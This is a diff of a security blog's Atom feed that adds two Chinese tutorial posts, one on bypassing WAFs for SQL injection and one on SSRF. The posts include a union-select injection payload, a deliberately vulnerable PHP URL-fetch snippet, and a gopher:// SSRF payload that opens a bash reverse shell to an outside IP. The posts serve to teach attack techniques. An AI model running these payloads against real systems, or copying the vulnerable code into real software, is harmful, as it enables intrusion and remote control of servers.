@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://das.scusec.org/"/>
-  <updated>2016-08-23T02:42:21.000Z</updated>
+  <updated>2016-08-23T02:53:49.000Z</updated>
   <id>http://das.scusec.org/</id>
   
   <author>
@@ -14,6 +14,78 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>浅谈waf下的sql注入绕过</title>
+    <link href="http://das.scusec.org/2016/08/23/waf-sql-bypass/"/>
+    <id>http://das.scusec.org/2016/08/23/waf-sql-bypass/</id>
+    <published>2016-08-23T02:53:49.000Z</published>
+    <updated>2016-08-23T02:53:49.000Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;几个月前在一个SRC的一个夺旗赛看了一下，题目里遇到了他们用自己的云waf保护起来的靶机，不禁心里为出题人鼓掌。直接对靶机奉上绕过策略当然有点蠢萌，不过作为探索研究决定继续往下看了看，当时运气不错，一顿测试后还真的找到了一个sql injection的bypass方法过了那题，觉得这个简单的绕过策略他们应该能抓到，等补了再写博客。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;结果。。。这两天聊到云waf想起这件事来。去主站看了一下，发现和上次测试区别是防御规则加上了web客户端指纹，发现恶意以后直接长时间屏蔽掉来自这个web客户端的请求。然而上次用的方法并没有被补上，本来想把payload作为绕过实例的，现在只好略过这个具体方法写思路了。正巧前段时间看到锁师兄在ali峰会上讲的waf防御的非主流技术，那记录一下测试思路和友情吹一波锁师兄。&lt;/p&gt;
+&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;WAF大体上可以划分到硬件防护、软件防护和云防护。其实有waf测试经验的话可以比较明显的返回包和从拦截表现区分出保护waf是哪一类，硬防一般直接把你的请求包丢弃，软防和云防一般会有自己独特的拦截页和拦截头。&lt;br&gt;大概一年前测过师兄公司系统外署的绿盟ips绕过。只能说硬防的规则有种不可描述的感觉，像不是从http层做的流量清洗，最终在注入语句后构造一定的尾巴再以及对间隔符的替换（当时这个ips发现对各种间隔符非常敏感）绕过了防御。盲测规则感觉是件挺耗心力的事。小尾巴大概长/**/‘1’=1–这样，改一个字符前面的绕过都会功亏一篑。。。不过核心思想还是查看引入哪些字符、替换同类函数以及做各种编码等哪些操作能不失语义地引发waf判断的变化。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818201051-1.png&quot; alt=&quot;测试截图&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x03&quot;&gt;&lt;a href=&quot;#0x03&quot; class=&quot;headerlink&quot; title=&quot;0x03&quot;&gt;&lt;/a&gt;0x03&lt;/h2&gt;&lt;p&gt;举个例子，从下面的图我们可以看到保护思路，一般的网站在接受云保护后是不会把进入流量限定到只为云waf所在位置，所以有一个比较简单粗暴的方法就是寻找到主机的真实IP，绕过云waf直接去访问网站主机。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818203051.png&quot; alt=&quot;结构示意图&quot;&gt;&lt;/p&gt;
+&lt;p&gt;不过正面突破也是有方法的，下面讲一个某waf注入绕过思路。&lt;/p&gt;
+&lt;p&gt;waf对sql注入的防御，做法将检测到的恶意流量进行过滤。那么问题的核心就在于恶意判断，由于攻击者可以在攻击向量中加入大量的冗余数据进行混淆，因此直接取原始流量判断效率低下。所以通常做法是先进行格式化、去冗余等。&lt;/p&gt;
+&lt;p&gt;那么假如一个无效字符没有被作为冗余数据被处理掉而进入waf判断器，则很有可能让攻击向量被判断器认为无害。（这里用锟来假设存在这样一个特殊字符，请求 “union锟%20select锟” 时可能被waf判断为无害的，因为 “union锟” 在判断器眼里和 “onion” 什么的差不多，然而sql执行时因为 “锟” 是一个无效的字符而被删除了），可以参考从容的 %23%0A+Emoji表情符 绕过方法。&lt;/p&gt;
+&lt;p&gt;同理，如果有效字符如果被认为是冗余字符而处理掉后进行判断，然而在sql执行器中却是起作用的，这样很可能让攻击向量逃过判断器审查，如紫苏叶的绕过方法：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;id =1 as &amp;#39;--+&amp;#39; union select 1,2,3%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;当然这些具体的绕过策略现在都已经修复了，但是只要这种存在缺陷的机制还在的话，这种漏洞仍会出现。&lt;/p&gt;
+&lt;p&gt;直接看实例吧，用主站演示，随便输一个语句被拦截了&lt;/p&gt;
+&lt;p&gt;（这个图还是隐藏了）&lt;/p&gt;
+&lt;p&gt;可以对比一下下面两张图，我们发现通过各种方式提交的一些冗余数据让waf规则变弱了，让本来无法通过的攻击向量生效了，当然，即使这样攻击向量也不能随意构造，必须使用一些混淆。稍微一点不注意还是会触发拦截，所以绕过测试需要很大的耐心和一点点运气。&lt;/p&gt;
+&lt;p&gt;前几天就这个方法和锁哥聊了一下，锁哥说union select这个地方绕过确实有办法，但查询如果使用information.schema这张表，会使waf变得更敏感，一些小细节都会触发规则。&lt;/p&gt;
+&lt;p&gt;这就意味着如果不是一个通用cms的话，我们将无法获得数据库结构，只能获取猜到的表名和字段名的内容。虽然from之后的混淆方法很少导致绕过困难，总归有办法的~&lt;/p&gt;
+&lt;p&gt;因为绕过方法还没修就隐去了一些具体细节，先记录思路，等修了再放测试图。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2016-0192841&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2016-0192841&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2015-0159517&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2015-0159517&lt;/a&gt;&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;几个月前在一个SRC的一个夺旗赛看了一下，题目里遇到了他们用自己的云waf保护起来的靶机，不禁心里为出题人鼓掌。直接对靶机奉上绕过策略当然有点蠢萌，不过作为探索研究决定继续往下看了看，当时运气不错，一顿测试后还真的找到了一个sql injection的bypass方法过了那题，觉得这个简单的绕过策略他们应该能抓到，等补了再写博客。
+    
+    </summary>
+    
+    
+      <category term="waf,注入,绕过" scheme="http://das.scusec.org/tags/waf-%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>从入门到精通SSRF（1）</title>
+    <link href="http://das.scusec.org/2016/08/23/easy-to-SSRF-1/"/>
+    <id>http://das.scusec.org/2016/08/23/easy-to-SSRF-1/</id>
+    <published>2016-08-23T02:53:13.000Z</published>
+    <updated>2016-08-23T02:53:13.000Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;先在php上写了一个ssrf简单环境。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151540.png&quot; alt=&quot;读取远程图片&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151520.png&quot; alt=&quot;使用其他协议&quot;&gt;&lt;/p&gt;
+&lt;p&gt;对比上面两张图，本来这个功能在头像功能也许大家都见过，可以直接填入图片的url地址设定它为自己的头像。然而如果对填入的url地址没有处理，就可能导致本机etc/passed或者内网文件被这个功能直接读取出来。&lt;br&gt;在开启其他脑洞，进行内网端口探测以后，假设内网存在 struts2命令执行 这种可以把exp通过get参数简单传入的漏洞 ，利用从这个ssrf点传入攻击代码反弹一个shell。。。那么这把钥匙则可以直接打开内网的大门。&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#60;?php &amp;#10;if (isset($_GET[&amp;#39;url&amp;#39;]))  &amp;#123;  &amp;#10;$content = file_get_contents($_GET[&amp;#39;url&amp;#39;]);  &amp;#10;$filename =&amp;#39;./images/&amp;#39;.rand().&amp;#39;img1.jpg&amp;#39;;  &amp;#10;file_put_contents($filename, $content);  &amp;#10;$img = &amp;#34;&amp;#60;img src=\&amp;#34;&amp;#34;.$filename.&amp;#34;\&amp;#34;/&amp;#62;&amp;#34;;  &amp;#10;&amp;#125;  &amp;#10;echo $img;  &amp;#10;?&amp;#62;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这个是简单测试代码，从代码上看，除了file_get_content()还有fsockopen()、curl_exec()等等资源获取的函数都可能存在这个漏洞。从黑盒来看，用户控制点作为资源地址传到函数中进行资源请求还是比较明显的，甚至有些vpn产品把这个当成一个正常的功能来使人员在外界可以访问到内网的系统。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151400-1024x674.png&quot; alt=&quot;做映射的vpn设备&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151428-1024x433.png&quot; alt=&quot;ssrf请求其他资源&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02&quot;&gt;&lt;a href=&quot;#0x02&quot; class=&quot;headerlink&quot; title=&quot;0x02&quot;&gt;&lt;/a&gt;0x02&lt;/h2&gt;&lt;p&gt;zzx说，能够对外发送网络请求的点都有可能存在ssrf漏洞。&lt;/p&gt;
+&lt;p&gt;因此针对应用二次挖掘的时候，在discuz、weblogic、sql连接器、xml执行器等等位置都可能存在这个漏洞。存在漏洞点对协议的支持也和是否能利用有很大关系，比如http get/put;webdav put;file;ftp/smtp/pop2;dict等等。&lt;br&gt;是否能够回显同样也是利用的重要因素，比如上面代码可以直接获取结果的完全回显，或者是只会返回成功失败的布尔回显以及甚至无回显。前段时间看到百度对自家ssrf的漏洞危险等级就是用回显程度来定义的。&lt;br&gt;如果漏洞存在点支持gopher协议可以直接用来进行文件操作getshell（参考gopher在xxe中的使用）。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &amp;#62;%2526 /dev/tcp/172.19.23.228/2333 0&amp;#62;%25261null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;所以简单来说，这个漏洞本身在很多地方都不被定义为漏洞。这个漏洞相当于一个起手式，比如一个布尔回显不支持gopher等协议的ssrf点，如果没有后招，则只能做一个内网拓扑，杀伤力很小。如果配合打出组合技则能打出意想不到的巨大杀伤，比如内网恰巧有一台未授权的redis。&lt;/p&gt;
+&lt;h2 id=&quot;0x03&quot;&gt;&lt;a href=&quot;#0x03&quot; class=&quot;headerlink&quot; title=&quot;0x03&quot;&gt;&lt;/a&gt;0x03&lt;/h2&gt;&lt;p&gt;在参考链接中给出一些我觉得这个漏洞利用比较经典的例子，更多的巧妙使用协议、巧妙组合其他利用就不再贴图了，抛砖引玉，有兴趣的少年可以进一步找出更多有趣的利用，脑洞有多大，漏洞能量就有多大。&lt;br&gt;最近的cve vBulletin rec中ssrf的利用就非常的经典。&lt;/p&gt;
+&lt;p&gt;参考链接&lt;br&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/8261&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://drops.wooyun.org/papers/8261&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://drops.wooyun.org/web/7550&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://drops.wooyun.org/web/7550&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2010-0213982&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2010-0213982&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2010-0214429&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2010-0214429&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/20407.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/web/20407.html&lt;/a&gt;&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="ksss,SSRF,gopher" scheme="http://das.scusec.org/tags/ksss-SSRF-gopher/"/>
+    
+  </entry>
   
   <entry>
     <title>代码审计——zcncms几处漏洞合集(二)</title>
